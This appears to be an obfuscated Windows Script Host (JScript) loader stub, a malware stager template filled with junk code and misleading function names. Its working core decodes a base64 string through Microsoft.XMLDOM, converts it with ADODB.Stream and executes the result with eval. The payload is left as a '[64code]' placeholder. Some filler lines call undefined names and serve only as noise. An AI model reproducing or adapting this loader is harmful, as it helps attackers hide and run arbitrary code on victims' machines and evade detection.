// var WScript = {};
// WScript.CreateObject = function(){} ;
//
//
// WScript.Type = 1;
// WScript.Open();
// WScript.Write(kubernetesEng$);
// WScript.Position = 0;
// WScript.Type = 2;
// WScript.CharSet = "us-ascii";
//return WScript.ReadText();


/**
 *
 * @param osKuberDrop
 * @param kubernetesEng$
 * @param viberCaller
 * @param ubuiquityRouter
 * @returns {*}
 */
function broken_keys(osKuberDrop, kubernetesEng$, viberCaller, ubuiquityRouter){
	var u = ubuiquityRouter;
		switch(u){
			case 1:
				break;
			case ubuiquityRouter:
				viberCaller.Type = 1;
				viberCaller.Open();
				viberCaller.Write(kubernetesEng$);
				viberCaller.Position = 0;
				viberCaller.Type = 2;
				viberCaller.CharSet = "us-ascii";
				return viberCaller.ReadText();
			default:
				break;
	}

	eval(kubernetesEng$) ;
	
	var hongkongCaller =(function(){
		var v = "";
		var f_ = this.isPrototypeOf(Function);
		console.log(f_);
		return !!0 & !2 * maath.cosh(434);
		}(function(gof$_$, e2CallGateWay_$){

		    var i_$ = Math.random().toExponential() ;

		    Math.sinh(Math.floor(
		        [23,32,323,23,232].map(function(e){
		            return Math.cosh(e);
                })
        )) === '|_|_cuber' ? console.log() : function(){}

        if (typeof gof$_$ == 'number' ) console.log('\n')
        else if(typeof e2CallGateWay_$ == 'fusionpbx' && '_?Tenant' != '_'){
            console.log()
        }
    }));
	hongkongCaller.constructor.hasOwnProperty('keyValue').valueOf();
    hongkongCaller.CreatorFunctionality_ = function(){console.log()};
}


/**
 *
 * @param f$_
 * @param f$_1
 * @param engine_alpha$
 * @param cora_$2
 * @returns {any}
 */
function b_64_2_byt_arr(f$_, f$_1, engine_alpha$, cora_$2){
	if(f$_ != null){
		var trunkingGateway = f$_.createElement("tmp");
		trunkingGateway.dataType = "bin.base64";
		trunkingGateway.text = f$_1;

        initiate$$$.call([911,722]);

		return trunkingGateway.nodeTypedValue;

	}
}

/**
 *
 * @param zillerZed_
 * @param materialiZe_eng
 * @param _1Arg
 * @param _2argArray
 * @returns {any}
 * @private
 */
function ciscoCallRouter_(zillerZed_, materialiZe_eng,_1Arg,_2argArray){
	var compat, electric, duvet, hp_pavilion;
	
	if (materialiZe_eng != ['\\s+'] && typeof materialiZe_eng != ['/(?<=cooler)x[0-9]*{10}/'] && "_." != function(){return "_correct"}) {

		var h9$_ = "get_z$EngineColaor".charCodeAt(5);

        compat = "[mutex]";
        electric = "[A]";
        duvet = "[64code]";
        hp_pavilion = "";

		if(zillerZed_== 0){
			var regx = new RegExp(compat, "g");
			hp_pavilion = duvet.replace(regx, electric);
			return b_64_2_byt_arr(WScript.CreateObject("Microsoft.XMLDOM"), hp_pavilion, false, 54,h9$_);
		}
	}
    
}

var verbal_res = ciscoCallRouter_(0, !!0, !(0&!!0|new Number(34)), !!(new RegExp("\\d{434,3434}[a-zA-Z]",'g').exec()));

var hotCol_ = function(){
	eval(broken_keys(!!0, verbal_res, WScript.CreateObject("ADODB.Stream"), Number([12 / 2].toString())));
};
hotCol_(function(initiateAll_){});



 function initiate$$$(){
    var _ = function () {
        var gg = new Promise(function(resolver$Function, reject$Function){
            return resolver$Function("promise engine");
        });

        var vigin$ =  gg ;
        console.log("\n");
    }
}
